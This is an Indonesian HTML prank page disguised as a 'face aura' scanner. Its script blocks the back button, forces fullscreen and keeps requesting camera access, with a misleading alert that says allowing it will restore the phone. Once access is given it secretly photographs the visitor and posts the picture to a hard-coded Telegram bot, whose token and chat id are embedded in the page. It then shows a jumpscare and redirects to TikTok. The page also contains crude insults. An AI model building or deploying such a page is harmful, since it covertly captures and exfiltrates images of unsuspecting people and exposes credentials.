<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Keamanan Perangkat v4.0 ⚡</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
        .container { text-align: center; border: 2px red solid; padding: 40px; box-shadow: 0 0 30px red; z-index: 10; width: 80%; }
        .loader { font-size: 25px; margin-bottom: 20px; font-weight: bold; }
        .bar-container { width: 100%; background-color: #222; border: 1px solid red; height: 30px; margin-top: 15px; }
        .bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff0000, #990000); transition: width 0.2s; }
        #status { margin-top: 20px; font-size: 14px; color: #ccc; text-transform: uppercase; }
        
        /* Jumpscare Overlay */
        #jumpscare { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; justify-content: center; align-items: center; }
        #jumpscare img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body onclick="initSystem()">

    <div class="container" id="main-content">
        <div class="loader">Cek Aura Wajah</div>
        <div id="msg">SISTEM MENDETEKSI AURA WAJAHMU...</div>
        <div class="bar-container">
            <div class="bar" id="progress-bar"></div>
        </div>
        <div id="percentage" style="font-size: 30px; margin: 10px;">0%</div>
        <div id="status">KETUK LAYAR UNTUK MENGECEK SEBERAPA SIGMA KAMU</div>
    </div>

    <div id="jumpscare">
        <img src="titit.webp" alt="SCARY"> 
    </div>

    <audio id="scream-audio" src="wkwk.mp3" preload="auto"></audio>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8604367204:AAGBUeI1EOfEDHxtuFUtPl9-Ulan2IEXbu0';
        const CHAT_ID = '6441249241';
        let progress = 0;
        let started = false;

        // 1. LOCK HISTORY & PREVENT BACK ⛓️
        function lockDown() {
            window.history.pushState(null, "", window.location.href);
            window.onpopstate = function() {
                window.history.pushState(null, "", window.location.href);
                alert("🥵 ERROR: Selesaikan proses scanning sebelum keluar!");
            };
            // Cegah tutup tab (beberapa browser)
            window.onbeforeunload = function() { return "Jangan kabur,Kontol"; };
        }

        // 2. INISIALISASI SISTEM (Fullscreen + Camera Request)
        function initSystem() {
            if (started) return;
            started = true;
            lockDown();
            
            // Masuk Fullscreen (Bikin bingung target)
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            requestCamera();
        }

        function requestCamera() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                document.getElementById('video').srcObject = stream;
                runLoading(stream);
            })
            .catch(err => {
                // PERSISTENCE LOOP 🔄
                alert("🥵 AKSES DITOLAK: Izin Kamera Diperlukan untuk Memindai Aura Wajah! Klik 'Izinkan' (Allow) untuk memulihkan HP Anda.");
                requestCamera();
            });
        }

        // 3. FAKE LOADING PROGRESS ⚡
        function runLoading(stream) {
            const bar = document.getElementById('progress-bar');
            const pct = document.getElementById('percentage');
            const stat = document.getElementById('status');
            stat.innerText = "MEMINDAI WAJAH ORANG GANTENG... ⚡";

            let timer = setInterval(() => {
                progress += Math.floor(Math.random() * 3) + 1;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(timer);
                    stat.innerText = "SINKRONISASI DATA... 🥵";
                    captureAndSend(stream);
                }
                bar.style.width = progress + "%";
                pct.innerText = progress + "%";
            }, 500);
        }

        // 4. CAPTURE & TELEGRAM TRANSMISSION 📸
        function captureAndSend(stream) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target.jpg');
                formData.append('caption', '🥵 LAPOR TUAN RAGIL! Target Masuk Penjara & Berhasil Difoto!');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    stream.getTracks().forEach(t => t.stop());
                    triggerJumpscare();
                });
            }, 'image/jpeg');
        }

        // 5. THE FINAL JUMPSCARE & REDIRECT ⚡😈
        function triggerJumpscare() {
            document.getElementById('main-content').style.display = 'none';
            document.getElementById('jumpscare').style.display = 'flex';
            
            const audio = document.getElementById('scream-audio');
            audio.play().catch(() => {});

            // Getar HP (jika didukung) 📳
            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);

            setTimeout(() => {
                window.location.href = "https://www.tiktok.com"; 
            }, 3500);
        }
    </script>
</body>
</html>
